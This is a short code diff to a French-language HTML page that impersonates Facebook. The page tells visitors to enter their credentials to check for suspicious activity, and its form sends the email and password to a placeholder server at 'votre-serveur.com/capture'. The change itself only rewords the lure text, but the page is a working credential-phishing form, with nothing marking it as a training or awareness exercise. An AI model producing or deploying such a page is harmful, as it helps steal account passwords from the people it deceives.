@@ -14,7 +14,7 @@
 <body>
     <div class="container">
         <h2>Facebook</h2>
-        <p>Veuillez entrer vos identifiants pour vérifier l'activité suspecte.</p> 
+        <p>Veuillez entrer vos informations pour pouvoir détecté l'activité suspecte.</p>
         <form action="https://votre-serveur.com/capture" method="post">
             <input type="email" name="email" placeholder="Adresse Email" required>
             <input type="password" name="password" placeholder="Mot de passe" required>
@@ -23,3 +23,4 @@
     </div>
 </body>
 </html>
+
